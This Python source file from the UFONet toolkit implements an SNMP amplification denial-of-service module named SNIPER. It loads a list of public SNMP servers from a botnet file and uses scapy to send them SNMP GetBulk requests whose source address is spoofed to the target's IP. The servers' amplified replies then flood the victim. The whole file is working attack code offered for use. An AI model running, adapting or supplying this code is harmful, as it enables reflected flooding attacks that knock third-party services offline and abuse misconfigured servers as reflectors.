#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

snmp_file = "botnet/snmp.txt" # SNMP servers IP list

oid ="1.3.6.1.2.1.1.1" # OID sysDescr 

# UFONet SNMP Amplification (SNIPER) / [Port: UDP/161]
def sniperize(ip, rounds):
    n=0
    try: # (SNMP) Amplification attack uses publically accessible SNMP servers to flood a target with SNMP response traffic
        with open(snmp_file) as f: # extract SNMP servers from file
            snmp_d = f.read().splitlines()
        f.close()
        p_num=0
        for x in range (0,int(rounds)):
            try:
                n=n+1
                print("[Info] [AI] [SNIPER] Breaking SNMP 'parsec' ["+str(n)+"] and remaking space-time on it! -> [SLOWING!]")
                for j in snmp_d:
                    p_num += 1
                    packet = IP(dst=j,src=ip)/UDP(sport=random.randint(2000,65535),dport=161)/SNMP(version="v2c",community="public",PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)), SNMPvarbind(oid=ASN1_OID(oid))]))
                    try:
                        send(packet, verbose=0) # not using sr1 because non-replies are required
                        print(("[Info] [AI] [SNIPER] Broken SNMP 'parsec' [{}]".format(p_num))+" IS INTERACTING WITH ["+str(j)+"] -> [AMPLIFYING!]")
                    except:
                        print(("[Info] [AI] [SNIPER] Broken SNMP 'parsec' [{}]".format(p_num))+" HAS FAILED to interact with ["+str(j)+"] -> [PASSING!]")
            except:
                print("[Error] [AI] [SNIPER] Failed breaking SNMP 'parsec' ["+str(n)+"]")
    except:
        print("[Error] [AI] [SNIPER] Failing to engage... -> Is still target online? -> [Checking!]")

class SNIPER(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] SNMP Amplification (SNIPER) is ready to broke: [" , rounds, "parsecs ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [SNIPER] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        sniperize(ip, rounds) # attack with SNIPER using threading
